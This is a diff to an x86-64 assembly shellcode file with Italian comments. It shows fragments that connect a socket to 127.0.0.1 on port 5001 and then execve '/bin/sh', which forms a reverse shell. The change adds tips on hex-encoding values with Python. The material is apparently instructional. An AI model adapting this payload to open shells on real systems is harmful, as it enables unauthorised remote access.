@@ -43,8 +43,8 @@ figlio:
         push rsi ; Mi riservo uno spazio di zero
         mov byte [rsp],0x2 ; Metto nei bit meno significativi AF_INET (=2) per un totale di un byte
         mov word [rsp+0x2],0x8913 ; Metto, alla sinistra di quanto appena scritto sopra, il valore della porta: 5001 (word=16 bit)
-        mov dword [rsp+0x4],0x0100007F ; Metto, alla sinistra di quanto appena scritto sopra, l'IP 127.0.0.1 (senza ``."; dword=32 bit)
-                                       ; Mi muovo sullo stack e scrivo sullo stack, tenendo conto del Little endian
+        mov dword [rsp+0x4],0x0100007F ; Metto, alla sinistra di quanto appena scritto sopra, l'IP 127.0.0.1 (senza ``."; dword=32 bit).
+                                       ; Mi muovo sullo stack e scrivo sullo stack, tenendo conto del Little endian.
         mov rsi,rsp ; Secondo aromento di connect: indirizzo di partenza della struct appena scritta sullo stack
         mov rdx,0x10 ; Terzo argomento di connect: la lunghezza del secondo argomento (deve essere di 16, anche
                      ; se non andro` mai a leggere oltre l'ultimo numero dell'indirizzo IP)
@@ -82,3 +82,8 @@ figlio:
         pop rdi ; Primo argomento: mi prendo l'indirizzo di partenza della stringa ``/bin/sh\0"
         mov rax,0x3B ; Identificativo della system call ``execve"
         syscall
+
+; -----------------------------------------------------------------------------------------------------------------------
+; | Per scrivere il numero della porta e il numero dell'indirizzo IP consiglio di utilizzare la funzione hex di Python. |
+; | Per stabilire la stringa "//bin/sh" in numeri esadecimali mi sono avvalso della funzione hex(ord()) di Python.      |
+; -----------------------------------------------------------------------------------------------------------------------
